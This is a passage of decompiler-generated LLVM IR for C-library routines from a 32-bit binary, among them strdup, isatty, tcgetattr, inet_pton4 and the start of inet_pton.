  %v2_804d0bc = load i8, i8* %v1_804d0bc, align 1
  %v3_804d0bc = zext i8 %v2_804d0bc to i32
  %v5_804d0bc = and i32 %v6_804d0bc27, -256
  %v6_804d0bc = or i32 %v3_804d0bc, %v5_804d0bc
  store i32 %v6_804d0bc, i32* @ecx, align 4
  %v4_804d0be = icmp eq i8 %v2_804d0bc, 0
  %v1_804d0c0 = icmp eq i1 %v4_804d0be, false
  br i1 %v1_804d0c0, label %dec_label_pc_804d0b7, label %dec_label_pc_804d0d4

dec_label_pc_804d0c4:                             ; preds = %dec_label_pc_804d0b7
  %v1_804d0c8 = add i32 %v0_804d0d435, 1
  %v1_804d0c9 = add i32 %v0_804d0c936, 1
  %v1_804d0ca = inttoptr i32 %v1_804d0c9 to i8*
  %v2_804d0ca = load i8, i8* %v1_804d0ca, align 1
  %v3_804d0ca = zext i8 %v2_804d0ca to i32
  %v5_804d0ca = and i32 %v6_804d0ca38, -256
  %v6_804d0ca = or i32 %v3_804d0ca, %v5_804d0ca
  %v4_804d0cc = icmp eq i8 %v2_804d0ca, 0
  br i1 %v4_804d0cc, label %dec_label_pc_804d0d4, label %dec_label_pc_804d0d0

dec_label_pc_804d0d0:                             ; preds = %dec_label_pc_804d0d0.lr.ph, %dec_label_pc_804d0c4
  %v4_804d0bc.pre = phi i32 [ %v4_804d0bc.pre.pre, %dec_label_pc_804d0d0.lr.ph ], [ %v6_804d0bc27, %dec_label_pc_804d0c4 ]
  %v6_804d0ca38 = phi i32 [ %v6_804d0ca33, %dec_label_pc_804d0d0.lr.ph ], [ %v6_804d0ca, %dec_label_pc_804d0c4 ]
  %v2_804d0ca37 = phi i8 [ %v2_804d0ca30, %dec_label_pc_804d0d0.lr.ph ], [ %v2_804d0ca, %dec_label_pc_804d0c4 ]
  %v0_804d0c936 = phi i32 [ %v4_804d0b1, %dec_label_pc_804d0d0.lr.ph ], [ %v1_804d0c9, %dec_label_pc_804d0c4 ]
  %v0_804d0d435 = phi i32 [ 0, %dec_label_pc_804d0d0.lr.ph ], [ %v1_804d0c8, %dec_label_pc_804d0c4 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_804d0bc19 = load i8, i8* %v1_804d0bc18, align 1
  %v3_804d0bc20 = zext i8 %v2_804d0bc19 to i32
  %v5_804d0bc21 = and i32 %v4_804d0bc.pre, -256
  %v6_804d0bc22 = or i32 %v3_804d0bc20, %v5_804d0bc21
  store i32 %v6_804d0bc22, i32* @ecx, align 4
  %v4_804d0be23 = icmp eq i8 %v2_804d0bc19, 0
  %v1_804d0c024 = icmp eq i1 %v4_804d0be23, false
  br i1 %v1_804d0c024, label %dec_label_pc_804d0b7, label %dec_label_pc_804d0d4

dec_label_pc_804d0d4:                             ; preds = %entry, %dec_label_pc_804d0c4, %dec_label_pc_804d0d0, %dec_label_pc_804d0bb
  %v0_804d0d417 = phi i32 [ %v0_804d0d435, %dec_label_pc_804d0bb ], [ %v0_804d0d435, %dec_label_pc_804d0d0 ], [ 0, %entry ], [ %v1_804d0c8, %dec_label_pc_804d0c4 ]
  ret i32 %v0_804d0d417

; uselistorder directives
  uselistorder i32 %v6_804d0bc22, { 1, 0 }
  uselistorder i8 %v2_804d0bc19, { 1, 2, 0 }
  uselistorder i32 %v1_804d0c9, { 1, 0 }
  uselistorder i32 %v6_804d0bc, { 1, 0 }
  uselistorder i8 %v2_804d0bc, { 1, 2, 0 }
  uselistorder i32 %v1_804d0bb, { 2, 1, 0 }
  uselistorder i8 %v2_804d0ca30, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d0d4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_804d0d0, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804d0dc = load i32, i32* @edi, align 4
  %v0_804d0dd = load i32, i32* @esi, align 4
  %v0_804d0de = load i32, i32* @ebx, align 4
  store i32 %v0_804d0de, i32* %stack_var_-12, align 4
  %v4_804d0df = ptrtoint i8* %arg1 to i32
  store i32 %v4_804d0df, i32* @edi, align 4
  %v3_804d0e7 = call i32 @strlen(i8* %arg1)
  %v1_804d0ec = add i32 %v3_804d0e7, 1
  store i32 %v1_804d0ec, i32* @esi, align 4
  %v2_804d0f2 = call i32 @malloc(i32 %v1_804d0ec)
  store i32 %v2_804d0f2, i32* %ebx.global-to-local, align 4
  %v1_804d0fc = icmp eq i32 %v2_804d0f2, 0
  br i1 %v1_804d0fc, label %dec_label_pc_804d10c, label %dec_label_pc_804d100

dec_label_pc_804d100:                             ; preds = %entry
  %v0_804d101 = load i32, i32* @esi, align 4
  %v0_804d102 = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_804d0f2 to i16*
  %v6_804d104 = call i32 @memcpy(i16* %tmp11, i32 %v0_804d102, i32 %v0_804d101)
  %v0_804d10c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d10c

dec_label_pc_804d10c:                             ; preds = %entry, %dec_label_pc_804d100
  %v0_804d10c = phi i32 [ 0, %entry ], [ %v0_804d10c.pre, %dec_label_pc_804d100 ]
  %v2_804d10e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d10e, i32* @ebx, align 4
  store i32 %v0_804d0dd, i32* @esi, align 4
  store i32 %v0_804d0dc, i32* @edi, align 4
  ret i32 %v0_804d10c

; uselistorder directives
  uselistorder i32 %v2_804d0f2, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 6, 5, 4, 3, 2, 1, 8, 7, 0 }
  uselistorder label %dec_label_pc_804d10c, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %v3_804d120 = call i32 @__GI_tcgetattr(i32 %arg1, i32* nonnull %stack_var_-60)
  %v1_804d125 = icmp eq i32 %v3_804d120, 0
  %v1_804d127 = zext i1 %v1_804d125 to i32
  ret i32 %v1_804d127
}

define i32 @__GI_tcgetattr(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = ptrtoint i32* %arg2 to i32
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804d134 = load i32, i32* @esi, align 4
  %v0_804d135 = load i32, i32* @ebx, align 4
  store i32 %v0_804d135, i32* %stack_var_-8, align 4
  %v2_804d139 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804d139, i32* %eax.global-to-local, align 4
  store i32 %tmp8, i32* @ebx, align 4
  %v3_804d14b = call i32 @ioctl(i32 %arg1, i32 21505, i32 %v2_804d139)
  store i32 %v3_804d14b, i32* %eax.global-to-local, align 4
  store i32 %v3_804d14b, i32* @esi, align 4
  %v1_804d155 = icmp eq i32 %v3_804d14b, 0
  %v1_804d157 = icmp eq i1 %v1_804d155, false
  br i1 %v1_804d157, label %dec_label_pc_804d19c, label %dec_label_pc_804d159

dec_label_pc_804d159:                             ; preds = %entry
  %v3_804d159 = load i32, i32* %stack_var_-44, align 4
  %v1_804d15d = load i32, i32* @ebx, align 4
  %v2_804d15d = inttoptr i32 %v1_804d15d to i32*
  store i32 %v3_804d159, i32* %v2_804d15d, align 4
  %v1_804d163 = load i32, i32* @ebx, align 4
  %v2_804d163 = add i32 %v1_804d163, 4
  %v3_804d163 = inttoptr i32 %v2_804d163 to i32*
  %v1_804d16a = load i32, i32* @ebx, align 4
  %v2_804d16a = add i32 %v1_804d16a, 8
  %v3_804d16a = inttoptr i32 %v2_804d16a to i32*
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v1_804d171 = load i32, i32* @ebx, align 4
  %v2_804d171 = add i32 %v1_804d171, 12
  %v3_804d171 = inttoptr i32 %v2_804d171 to i32*
  store i32 %tmp3, i32* %v3_804d171, align 4
  %v4_804d174 = zext i8 %tmp to i32
  %v5_804d174 = load i32, i32* %eax.global-to-local, align 4
  %v6_804d174 = and i32 %v5_804d174, -256
  %v7_804d174 = or i32 %v6_804d174, %v4_804d174
  store i32 %v7_804d174, i32* %eax.global-to-local, align 4
  %v2_804d178 = load i32, i32* @ebx, align 4
  %v3_804d178 = add i32 %v2_804d178, 16
  %v4_804d178 = inttoptr i32 %v3_804d178 to i8*
  store i8 %tmp, i8* %v4_804d178, align 1
  %v0_804d17b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d17e = ptrtoint i32* %stack_var_-27 to i32
  %v0_804d183 = load i32, i32* @ebx, align 4
  %v1_804d183 = add i32 %v0_804d183, 17
  store i32 %v1_804d183, i32* %eax.global-to-local, align 4
  %v4_804d187 = call i32 @__GI_mempcpy(i32 %v1_804d183, i32 %v2_804d17e, i32 19, i32 %v0_804d17b)
  store i32 %v4_804d187, i32* %eax.global-to-local, align 4
  %v3_804d194 = inttoptr i32 %v4_804d187 to i8*
  %v4_804d194 = call i32 @__GI_memset(i8* %v3_804d194, i32 0, i32 13)
  store i32 %v4_804d194, i32* %eax.global-to-local, align 4
  %v0_804d19c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d19c

dec_label_pc_804d19c:                             ; preds = %entry, %dec_label_pc_804d159
  %v0_804d19c = phi i32 [ %v3_804d14b, %entry ], [ %v0_804d19c.pre, %dec_label_pc_804d159 ]
  store i32 %v0_804d19c, i32* %eax.global-to-local, align 4
  %v2_804d1a1 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804d1a1, i32* @ebx, align 4
  store i32 %v0_804d134, i32* @esi, align 4
  ret i32 %v0_804d19c

; uselistorder directives
  uselistorder i32 %v0_804d19c, { 1, 0 }
  uselistorder i32 %v3_804d14b, { 0, 2, 1, 3 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i8 %tmp, { 1, 0 }
  uselistorder i32 13, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d19c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_804d1a6 = load i32, i32* @esi, align 4
  %v0_804d1ad = load i32, i32* @eax, align 4
  store i32 %v0_804d1ad, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804d1b3 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d1b3, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_804d1fb15 = inttoptr i32 %v0_804d1ad to i8*
  %v2_804d1fb16 = load i8, i8* %v1_804d1fb15, align 1
  %v3_804d1fb17 = sext i8 %v2_804d1fb16 to i32
  store i32 %v3_804d1fb17, i32* @ecx, align 4
  %v1_804d1fe18 = add i32 %v0_804d1ad, 1
  store i32 %v1_804d1fe18, i32* %ebx.global-to-local, align 4
  %v1_804d1ff19 = icmp eq i8 %v2_804d1fb16, 0
  %v1_804d20120 = icmp eq i1 %v1_804d1ff19, false
  br i1 %v1_804d20120, label %dec_label_pc_804d1be, label %dec_label_pc_804d203.thread

dec_label_pc_804d203.thread:                      ; preds = %entry
  br label %dec_label_pc_804d220

dec_label_pc_804d1be:                             ; preds = %entry, %dec_label_pc_804d1fb.backedge
  %v3_804d1fb22 = phi i32 [ %v3_804d1fb, %dec_label_pc_804d1fb.backedge ], [ %v3_804d1fb17, %entry ]
  %v2_804d1fb21 = phi i8 [ %v2_804d1fb, %dec_label_pc_804d1fb.backedge ], [ %v2_804d1fb16, %entry ]
  %v1_804d1be = add nsw i32 %v3_804d1fb22, -48
  store i32 %v1_804d1be, i32* %eax.global-to-local, align 4
  %v6_804d1c4 = icmp ugt i32 %v1_804d1be, 9
  br i1 %v6_804d1c4, label %dec_label_pc_804d1e7, label %dec_label_pc_804d1c6

dec_label_pc_804d1c6:                             ; preds = %dec_label_pc_804d1be
  %v0_804d1c6 = load i32, i32* @esi, align 4
  %v1_804d1c6 = inttoptr i32 %v0_804d1c6 to i8*
  %v2_804d1c6 = load i8, i8* %v1_804d1c6, align 1
  %v2_804d1c9 = zext i8 %v2_804d1c6 to i32
  %v3_804d1c9 = mul nuw nsw i32 %v2_804d1c9, 10
  %v3_804d1cc = add nsw i32 %v3_804d1c9, %v1_804d1be
  store i32 %v3_804d1cc, i32* %eax.global-to-local, align 4
  %v6_804d1d5 = icmp ugt i32 %v3_804d1cc, 255
  br i1 %v6_804d1d5, label %dec_label_pc_804d220, label %dec_label_pc_804d1d7

dec_label_pc_804d1d7:                             ; preds = %dec_label_pc_804d1c6
  %v1_804d1d7 = trunc i32 %v3_804d1cc to i8
  store i8 %v1_804d1d7, i8* %v1_804d1c6, align 1
  %v0_804d1d9 = load i32, i32* @edx, align 4
  %v1_804d1d9 = icmp eq i32 %v0_804d1d9, 0
  %v1_804d1db = icmp eq i1 %v1_804d1d9, false
  br i1 %v1_804d1db, label %dec_label_pc_804d1fb.backedge, label %dec_label_pc_804d1dd

dec_label_pc_804d1dd:                             ; preds = %dec_label_pc_804d1d7
  %v0_804d1dd = load i32, i32* @edi, align 4
  %v1_804d1dd = add i32 %v0_804d1dd, 1
  store i32 %v1_804d1dd, i32* @edi, align 4
  %v1_804d1de = add i32 %v0_804d1dd, -3
  %v6_804d1de = sub i32 2, %v0_804d1dd
  %v7_804d1de = and i32 %v6_804d1de, %v1_804d1dd
  %v8_804d1de = icmp slt i32 %v7_804d1de, 0
  %v9_804d1de = icmp eq i32 %v1_804d1de, 0
  %v10_804d1de = icmp slt i32 %v1_804d1de, 0
  %v3_804d1e1 = icmp eq i1 %v10_804d1de, %v8_804d1de
  %v4_804d1e1 = icmp eq i1 %v9_804d1de, false
  %v5_804d1e1 = and i1 %v4_804d1e1, %v3_804d1e1
  br i1 %v5_804d1e1, label %dec_label_pc_804d220, label %dec_label_pc_804d1e3

dec_label_pc_804d1e3:                             ; preds = %dec_label_pc_804d1dd
  %v1_804d1e3 = and i32 %v0_804d1d9, -256
  %v2_804d1e3 = or i32 %v1_804d1e3, 1
  store i32 %v2_804d1e3, i32* @edx, align 4
  br label %dec_label_pc_804d1fb.backedge

dec_label_pc_804d1e7:                             ; preds = %dec_label_pc_804d1be
  %v9_804d1e7 = icmp eq i8 %v2_804d1fb21, 46
  %v1_804d1ea = icmp eq i1 %v9_804d1e7, false
  br i1 %v1_804d1ea, label %dec_label_pc_804d220, label %dec_label_pc_804d1ec

dec_label_pc_804d1ec:                             ; preds = %dec_label_pc_804d1e7
  %v0_804d1ec = load i32, i32* @edx, align 4
  %v1_804d1ec = icmp eq i32 %v0_804d1ec, 0
  br i1 %v1_804d1ec, label %dec_label_pc_804d220, label %dec_label_pc_804d1f0

dec_label_pc_804d1f0:                             ; preds = %dec_label_pc_804d1ec
  %v0_804d1f0 = load i32, i32* @edi, align 4
  %v9_804d1f0 = icmp eq i32 %v0_804d1f0, 4
  br i1 %v9_804d1f0, label %dec_label_pc_804d220, label %dec_label_pc_804d1f5

dec_label_pc_804d1f5:                             ; preds = %dec_label_pc_804d1f0
  %v0_804d1f5 = load i32, i32* @esi, align 4
  %v1_804d1f5 = add i32 %v0_804d1f5, 1
  store i32 %v1_804d1f5, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_804d1f8 = inttoptr i32 %v1_804d1f5 to i8*
  store i8 0, i8* %v1_804d1f8, align 1
  br label %dec_label_pc_804d1fb.backedge

dec_label_pc_804d1fb.backedge:                    ; preds = %dec_label_pc_804d1f5, %dec_label_pc_804d1e3, %dec_label_pc_804d1d7
  %v0_804d1fb.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d1fb = inttoptr i32 %v0_804d1fb.pre to i8*
  %v2_804d1fb = load i8, i8* %v1_804d1fb, align 1
  %v3_804d1fb = sext i8 %v2_804d1fb to i32
  store i32 %v3_804d1fb, i32* @ecx, align 4
  %v1_804d1fe = add i32 %v0_804d1fb.pre, 1
  store i32 %v1_804d1fe, i32* %ebx.global-to-local, align 4
  %v1_804d1ff = icmp eq i8 %v2_804d1fb, 0
  %v1_804d201 = icmp eq i1 %v1_804d1ff, false
  br i1 %v1_804d201, label %dec_label_pc_804d1be, label %dec_label_pc_804d203

dec_label_pc_804d203:                             ; preds = %dec_label_pc_804d1fb.backedge
  %v0_804d203.pre = load i32, i32* @edi, align 4
  %v7_804d206 = icmp sgt i32 %v0_804d203.pre, 3
  br i1 %v7_804d206, label %dec_label_pc_804d208, label %dec_label_pc_804d220

dec_label_pc_804d208:                             ; preds = %dec_label_pc_804d203
  %v0_804d208 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v2_804d1b3, i32* %eax.global-to-local, align 4
  %v3_804d211 = bitcast i32* %stack_var_-20 to i16*
  %v4_804d211 = call i32 @memcpy(i16* %v3_804d211, i32 4, i32 %v0_804d208)
  br label %dec_label_pc_804d222

dec_label_pc_804d220:                             ; preds = %dec_label_pc_804d1f0, %dec_label_pc_804d1ec, %dec_label_pc_804d1e7, %dec_label_pc_804d1dd, %dec_label_pc_804d1c6, %dec_label_pc_804d203.thread, %dec_label_pc_804d203
  br label %dec_label_pc_804d222

dec_label_pc_804d222:                             ; preds = %dec_label_pc_804d208, %dec_label_pc_804d220
  %storemerge = phi i32 [ 0, %dec_label_pc_804d220 ], [ 1, %dec_label_pc_804d208 ]
  %v0_804d229 = phi i32 [ 0, %dec_label_pc_804d220 ], [ 1, %dec_label_pc_804d208 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804d1a6, i32* @esi, align 4
  ret i32 %v0_804d229

; uselistorder directives
  uselistorder i32 %v3_804d1fb, { 1, 0 }
  uselistorder i8 %v2_804d1fb, { 1, 2, 0 }
  uselistorder i32 %v1_804d1de, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32 255, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_804d222, { 1, 0 }
  uselistorder label %dec_label_pc_804d220, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804d1be, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804d22a = load i32, i32* @ebp, align 4
  %v0_804d22b = load i32, i32* @edi, align 4
  %v0_804d22c = load i32, i32* @esi, align 4
  %v0_804d22d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_804d235 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804d235, i32* @edi, align 4
  %v9_804d239 = icmp eq i32 %arg1, 2
  br i1 %v9_804d239, label %dec_label_pc_804d249, label %dec_label_pc_804d23e

dec_label_pc_804d23e:                             ; preds = %entry
  %v9_804d23e = icmp eq i32 %arg1, 10
  %v1_804d241 = icmp eq i1 %v9_804d23e, false
  br i1 %v1_804d241, label %dec_label_pc_804d3da, label %dec_label_pc_804d259

dec_label_pc_804d249:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_804d235, i32* @eax, align 4
  %v3_804d24f = call i32 @inet_pton4(i32 %v0_804d22d, i32 %v0_804d22c, i32 %v0_804d22b)
  store i32 %v3_804d24f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d3ec

dec_label_pc_804d259:                             ; preds = %dec_label_pc_804d23e
  %v2_804d25e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d25e, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_804d263 = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_804d263, i32* @ebx, align 4
  %v2_804d26a = add i32 %v5_804d263, 16
  store i32 %v2_804d26a, i32* %eax.global-to-local, align 4
  %v0_804d274 = load i32, i32* @edi, align 4
  %v1_804d274 = inttoptr i32 %v0_804d274 to i8*
  %v2_804d274 = load i8, i8* %v1_804d274, align 1
  %v11_804d274 = icmp eq i8 %v2_804d274, 58
  %v1_804d277 = icmp eq i1 %v11_804d274, false
  br i1 %v1_804d277, label %dec_label_pc_804d30a, label %dec_label_pc_804d279

dec_label_pc_804d279:                             ; preds = %dec_label_pc_804d259
  %v1_804d279 = add i32 %v0_804d274, 1
  store i32 %v1_804d279, i32* @edi, align 4
  %v1_804d27a = inttoptr i32 %v1_804d279 to i8*
  %v2_804d27a = load i8, i8* %v1_804d27a, align 1
  %v11_804d27a = icmp eq i8 %v2_804d27a, 58
  %v1_804d27d = icmp eq i1 %v11_804d27a, false
  br i1 %v1_804d27d, label %dec_label_pc_804d3ea, label %dec_label_pc_804d30a

dec_label_pc_804d291:                             ; preds = %dec_label_pc_804d34a
  %v4_804d299 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_805063c.107, i32 0, i32 0), i32 %v2_804d351)
  store i32 %v4_804d299, i32* %eax.global-to-local, align 4
  %v0_804d29e = load i32, i32* @edi, align 4
  %v1_804d29e = add i32 %v0_804d29e, 1
  store i32 %v1_804d29e, i32* @edi, align 4
  %v1_804d2a2 = icmp eq i32 %v4_804d299, 0
  br i1 %v1_804d2a2, label %dec_label_pc_804d2c1, label %dec_label_pc_804d2a6

dec_label_pc_804d2a6:                             ; preds = %dec_label_pc_804d291
  %v0_804d2a6 = load i32, i32* @ebp, align 4
  %v2_804d2a6 = mul i32 %v0_804d2a6, 16
  %v1_804d2a9 = add i32 %v4_804d299, -134547004
  store i32 %v1_804d2a9, i32* %eax.global-to-local, align 4
  %v2_804d2ae = or i32 %v2_804d2a6, %v1_804d2a9
  store i32 %v2_804d2ae, i32* @ebp, align 4
  %tmp127 = icmp ult i32 %v2_804d2ae, 65536
  br i1 %tmp127, label %dec_label_pc_804d34a.outer, label %dec_label_pc_804d3ea

dec_label_pc_804d34a.outer:                       ; preds = %dec_label_pc_804d2a6, %dec_label_pc_804d30a
  %v0_804d34d37 = phi i32 [ %v1_804d29e, %dec_label_pc_804d2a6 ], [ %stack_var_-36.0.in, %dec_label_pc_804d30a ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d2a6 ], [ %stack_var_-44.0, %dec_label_pc_804d30a ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_804d2a6 ], [ %stack_var_-36.0, %dec_label_pc_804d30a ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_804d2a6 ], [ 0, %dec_label_pc_804d30a ]
  %v4_804d2c6 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_804d2cb = icmp eq i1 %v4_804d2c6, false
  br label %dec_label_pc_804d34a

dec_label_pc_804d2c1:                             ; preds = %dec_label_pc_804d291
  %v0_804d2c1 = load i32, i32* @esi, align 4
  %v9_804d2c1 = icmp eq i32 %v0_804d2c1, 58
  %v1_804d2c4 = icmp eq i1 %v9_804d2c1, false
  br i1 %v1_804d2c4, label %dec_label_pc_804d316, label %dec_label_pc_804d2c6

dec_label_pc_804d2c6:                             ; preds = %dec_label_pc_804d2c1
  br i1 %v1_804d2cb, label %dec_label_pc_804d2e2, label %dec_label_pc_804d2cd

dec_label_pc_804d2cd:                             ; preds = %dec_label_pc_804d2c6
  %v5_804d2cd = icmp eq i8* %stack_var_-44.1, null
  %v1_804d2d2 = icmp eq i1 %v5_804d2cd, false
  br i1 %v1_804d2d2, label %dec_label_pc_804d3ea, label %dec_label_pc_804d2d8

dec_label_pc_804d2d8:                             ; preds = %dec_label_pc_804d2cd
  %v0_804d2d8 = load i32, i32* @ebx, align 4
  %v5_804d2d8 = inttoptr i32 %v0_804d2d8 to i8*
  %v5_804d2dc = inttoptr i32 %v1_804d29e to i8*
  br label %dec_label_pc_804d34a

dec_label_pc_804d2e2:                             ; preds = %dec_label_pc_804d2c6
  %v1_804d2e2 = inttoptr i32 %v1_804d29e to i8*
  %v2_804d2e2 = load i8, i8* %v1_804d2e2, align 1
  %v3_804d2e2 = icmp eq i8 %v2_804d2e2, 0
  br i1 %v3_804d2e2, label %dec_label_pc_804d3ea, label %dec_label_pc_804d2eb

dec_label_pc_804d2eb:                             ; preds = %dec_label_pc_804d2e2
  %v0_804d2eb = load i32, i32* @ebx, align 4
  %v1_804d2eb = add i32 %v0_804d2eb, 2
  store i32 %v1_804d2eb, i32* @edx, align 4
  %v6_804d2f2 = icmp ugt i32 %v1_804d2eb, %v2_804d26a
  br i1 %v6_804d2f2, label %dec_label_pc_804d3ea, label %dec_label_pc_804d2f8

dec_label_pc_804d2f8:                             ; preds = %dec_label_pc_804d2eb
  %v0_804d2f8 = load i32, i32* @ebp, align 4
  %v2_804d2fa = udiv i32 %v0_804d2f8, 256
  %v4_804d2fa = trunc i32 %v2_804d2fa to i8
  %v3_804d2fd = inttoptr i32 %v0_804d2eb to i8*
  store i8 %v4_804d2fa, i8* %v3_804d2fd, align 1
  %v0_804d2ff = load i32, i32* @ebp, align 4
  store i32 %v0_804d2ff, i32* %eax.global-to-local, align 4
  %v1_804d301 = trunc i32 %v0_804d2ff to i8
  %v2_804d301 = load i32, i32* @ebx, align 4
  %v3_804d301 = add i32 %v2_804d301, 1
  %v4_804d301 = inttoptr i32 %v3_804d301 to i8*
  store i8 %v1_804d301, i8* %v4_804d301, align 1
  %v0_804d304 = load i32, i32* @edx, align 4
  store i32 %v0_804d304, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d30a

dec_label_pc_804d30a:                             ; preds = %dec_label_pc_804d259, %dec_label_pc_804d279, %dec_label_pc_804d2f8
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_804d2f8 ], [ %v1_804d279, %dec_label_pc_804d279 ], [ %v0_804d274, %dec_label_pc_804d259 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_804d2f8 ], [ null, %dec_label_pc_804d279 ], [ null, %dec_label_pc_804d259 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_804d34a.outer

dec_label_pc_804d316:                             ; preds = %dec_label_pc_804d2c1
  %v9_804d316 = icmp eq i32 %v0_804d2c1, 46
  %v1_804d319 = icmp eq i1 %v9_804d316, false
  br i1 %v1_804d319, label %dec_label_pc_804d3ea, label %dec_label_pc_804d31f

dec_label_pc_804d31f:                             ; preds = %dec_label_pc_804d316
  %v0_804d31f = load i32, i32* @ebx, align 4
  %v1_804d31f = add i32 %v0_804d31f, 4
  store i32 %v1_804d31f, i32* @esi, align 4
  %v6_804d326 = icmp ugt i32 %v1_804d31f, %v2_804d26a
  br i1 %v6_804d326, label %dec_label_pc_804d3ea, label %dec_label_pc_804d32c

dec_label_pc_804d32c:                             ; preds = %dec_label_pc_804d31f
  store i32 %v0_804d31f, i32* @edx, align 4
  %v4_804d32e = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_804d32e, i32* @eax, align 4
  %v2_804d332 = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_804d332 = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_804d332, i32 %v2_804d26a)
  store i32 %v5_804d332, i32* %eax.global-to-local, align 4
  %v0_804d337 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_804d332, 1
  %tmp63 = icmp eq i1 %tmp62, false
  br i1 %tmp63, label %dec_label_pc_804d381, label %dec_label_pc_804d3ea

dec_label_pc_804d34a:                             ; preds = %dec_label_pc_804d34a.outer, %dec_label_pc_804d2d8
  %v0_804d34d = phi i32 [ %v1_804d29e, %dec_label_pc_804d2d8 ], [ %v0_804d34d37, %dec_label_pc_804d34a.outer ]
  %stack_var_-44.1 = phi i8* [ %v5_804d2d8, %dec_label_pc_804d2d8 ], [ %stack_var_-44.1.ph, %dec_label_pc_804d34a.outer ]
  %stack_var_-36.1 = phi i8* [ %v5_804d2dc, %dec_label_pc_804d2d8 ], [ %stack_var_-36.1.ph, %dec_label_pc_804d34a.outer ]
  %v1_804d34d = inttoptr i32 %v0_804d34d to i8*
  %v2_804d34d = load i8, i8* %v1_804d34d, align 1
  %v3_804d34d = sext i8 %v2_804d34d to i32
  store i32 %v3_804d34d, i32* %eax.global-to-local, align 4
  %v2_804d351 = call i32 @__GI_tolower(i32 %v3_804d34d)
  store i32 %v2_804d351, i32* %eax.global-to-local, align 4
  store i32 %v2_804d351, i32* @esi, align 4
  %v1_804d35b = icmp eq i32 %v2_804d351, 0
  %v1_804d35d = icmp eq i1 %v1_804d35b, false
  br i1 %v1_804d35d, label %dec_label_pc_804d291, label %dec_label_pc_804d363

dec_label_pc_804d363:                             ; preds = %dec_label_pc_804d34a
  %v0_804d3b9.pre.pre = load i32, i32* @ebx, align 4
  br i1 %v4_804d2c6, label %dec_label_pc_804d381, label %dec_label_pc_804d36a

dec_label_pc_804d36a:                             ; preds = %dec_label_pc_804d363
  %v1_804d36a = add i32 %v0_804d3b9.pre.pre, 2
  store i32 %v1_804d36a, i32* @edx, align 4
  %v6_804d371 = icmp ugt i32 %v1_804d36a, %v2_804d26a
